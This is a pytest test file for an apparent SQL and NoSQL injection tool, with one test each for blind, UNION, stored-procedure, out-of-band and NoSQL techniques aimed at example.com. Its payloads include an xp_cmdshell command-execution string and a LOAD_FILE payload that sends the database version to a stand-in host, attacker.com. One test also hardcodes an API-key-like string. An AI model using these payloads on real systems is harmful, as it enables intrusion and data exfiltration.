import pytest
from unittest.mock import Mock, patch
from ..techniques.injection_handler import InjectionHandler, InjectionType, InjectionResult

@pytest.fixture
def injection_handler():
    return InjectionHandler()

@pytest.mark.asyncio
async def test_blind_injection():
    """Test blind SQL injection technique"""
    handler = InjectionHandler()
    target = "http://example.com/vulnerable.php"
    payload = "1' AND SLEEP(5)--"
    options = {"delay": 5, "technique": "time"}
    
    result = await handler.execute_blind_injection(target, payload, options)
    assert isinstance(result, InjectionResult)
    assert result.success is True
    assert "payload" in result.data
    assert result.data["type"] == "blind"

@pytest.mark.asyncio
async def test_union_injection():
    """Test UNION-based SQL injection"""
    handler = InjectionHandler()
    target = "http://example.com/vulnerable.php"
    payload = "UNION SELECT 1,2,3--"
    options = {"columns": 3, "column_type": "string"}
    
    result = await handler.execute_union_injection(target, payload, options)
    assert isinstance(result, InjectionResult)
    assert result.success is True
    assert "payload" in result.data
    assert result.data["type"] == "union"

@pytest.mark.asyncio
async def test_stored_procedure():
    """Test stored procedure injection"""
    handler = InjectionHandler()
    target = "http://example.com/vulnerable.php"
    payload = "EXEC xp_cmdshell 'whoami'"
    options = {
        "procedure": "xp_cmdshell",
        "command": "whoami"
    }
    
    result = await handler.execute_stored_procedure(target, payload, options)
    assert isinstance(result, InjectionResult)
    assert result.success is True
    assert "payload" in result.data
    assert result.data["type"] == "stored_proc"

@pytest.mark.asyncio
async def test_out_of_band():
    """Test out-of-band injection"""
    handler = InjectionHandler()
    target = "http://example.com/vulnerable.php"
    payload = "SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com'))"
    options = {
        "callback_url": "attacker.com",
        "data": "@@version"
    }
    
    result = await handler.execute_out_of_band(target, payload, options)
    assert isinstance(result, InjectionResult)
    assert result.success is True
    assert "payload" in result.data
    assert result.data["type"] == "out_of_band"

@pytest.mark.asyncio
async def test_nosql_injection():
    """Test NoSQL injection"""
    handler = InjectionHandler()
    target = "http://example.com/vulnerable.php"
    payload = '{"$ne": null}'
    options = {
        "operator": "$ne",
        "value": "null"
    }
    
    result = await handler.execute_nosql_injection(target, payload, options)
    assert isinstance(result, InjectionResult)
    assert result.success is True
    assert "payload" in result.data
    assert result.data["type"] == "nosql"

@pytest.mark.asyncio
async def test_invalid_technique():
    """Test handling of invalid injection technique"""
    handler = InjectionHandler()
    target = "http://example.com/vulnerable.php"
    payload = "test"
    options = {}
    
    with pytest.raises(ValueError):
        await handler.execute_injection(
            "invalid_technique",
            target,
            payload,
            options
        )

@pytest.mark.asyncio
async def test_deepseek_analysis():
    """Test Deepseek integration for payload analysis"""
    handler = InjectionHandler()
    payload = "SELECT * FROM users WHERE id = 1"
    
    with patch('aiohttp.ClientSession.post') as mock_post:
        mock_post.return_value.__aenter__.return_value.status = 200
        mock_post.return_value.__aenter__.return_value.json = Mock(
            return_value={
                "analysis": {
                    "risk_level": "high",
                    "explanation": "This query is vulnerable to SQL injection"
                }
            }
        )
        
        result = await handler.analyze_with_deepseek(
            payload,
            "sk-1bd5de3f31db429cb8cbe73875537c5c"
        )
        
        assert result is not None
        assert "risk_level" in result["analysis"]
        assert "explanation" in result["analysis"]

@pytest.mark.asyncio
async def test_error_handling():
    """Test error handling in injection techniques"""
    handler = InjectionHandler()
    target = "http://example.com/vulnerable.php"
    payload = None  # Invalid payload
    options = {}
    
    result = await handler.execute_blind_injection(target, payload, options)
    assert isinstance(result, InjectionResult)
    assert result.success is False
    assert result.error is not None

def test_available_techniques():
    """Test getting available injection techniques"""
    handler = InjectionHandler()
    techniques = handler.get_available_techniques()
    
    assert isinstance(techniques, list)
    assert len(techniques) > 0
    assert "blind" in techniques
    assert "union" in techniques
    assert "stored_proc" in techniques
